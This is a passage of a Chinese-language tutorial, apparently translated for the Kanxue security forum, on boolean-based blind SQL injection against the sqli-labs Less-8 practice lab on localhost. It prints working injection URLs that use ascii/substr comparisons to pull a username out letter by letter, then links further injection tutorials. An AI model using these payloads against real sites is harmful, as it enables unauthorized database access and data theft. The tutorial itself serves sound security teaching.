
`http://localhost:81/sqli/Less-8/?id=1' AND (ascii(substr((select username from users limit 0,1),1,1))) > 70 --+`

![](https://bbs.kanxue.com/upload/attach/201707/747240_clu9jpyiq38uy8h.png)

由上图可以看出，该用户名第一个字符的ASCII码不大于70。结合上面可知，该用户名第一个字符的ASCII码位于60到70之间，接着逐个检测。

`http://localhost:81/sqli/Less-8/?id=1' AND (ascii(substr((select username from users limit 0,1),1,1))) = 68 --+`

![](https://bbs.kanxue.com/upload/attach/201707/747240_xtv5xr736eobxbx.png)

由上图可以看出，该用户名第一个字符的ASCII码等于68。这意味着第一个字符为'D'。

同理即可得到该用户名的全部字符，如下：

```
1 = D = 68
2 = u = 117
3 = m = 109
4 = b = 98
```

到此为止，我们已经学会了如何使用盲注技术来攻击数据库。

相关文章：

[SQL注入新手教程 （第一部分）](http://bbs.pediy.com/thread-218235.htm "SQL注入新手教程（第1部分）")

[一步步手动进行SQL注入](http://bbs.pediy.com/thread-219096.htm "一步步手动进行SQL注入")

[如何手动绕过SQL注入过滤器？（一）](http://bbs.pediy.com/thread-219137.htm "如何手动绕过SQL注入过滤器？（一）")

[如何手动绕过SQL注入过滤器？（二）](http://bbs.pediy.com/thread-219146.htm "如何手动绕过SQL注入过滤器？（二）")

[如何手动绕过SQL注入过滤器？（三）](http://bbs.pediy.com/thread-219149.htm "如何手动绕过SQL注入过滤器？（三）")

[基于表单的SQL注入（手动）](http://bbs.pediy.com/thread-219156.htm "基于表单的SQL注入（手动）")

[使用OUTFILE导出数据库数据](http://bbs.pediy.com/thread-219176.htm "使用OUTFILE导出数据库数据")

原文链接：[83dK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3S2S2j5$3E0A6L8X3N6S2M7Y4c8A6j5$3I4W2M7#2)9J5k6h3W2F1i4K6u0r3j5X3g2Y4K9h3&6F1k6i4u0Q4x3X3c8Y4N6h3W2V1k6g2)9J5k6s2y4I4L8q4)9J5k6r3W2F1K9X3g2U0N6r3W2G2L8W2)9J5k6r3u0G2L8$3I4W2j5h3&6Q4x3X3c8T1j5i4y4W2k6q4)9J5k6s2m8S2M7Y4c8Q4x3X3b7J5i4K6u0r3](https://bbs.kanxue.com/elink@7a8K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3S2S2j5$3E0A6L8X3N6S2M7Y4c8A6j5$3I4W2M7#2)9J5k6h3W2F1i4K6u0r3j5X3g2Y4K9h3&6F1k6i4u0Q4x3X3c8Y4N6h3W2V1k6g2)9J5k6s2y4I4L8q4)9J5k6r3W2F1K9X3g2U0N6r3W2G2L8W2)9J5k6r3u0G2L8$3I4W2j5h3&6Q4x3X3c8T1j5i4y4W2k6q4)9J5k6s2m8S2M7Y4c8Q4x3X3b7J5i4K6u0r3)

本文由 看雪翻译小组 hesir 编译

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
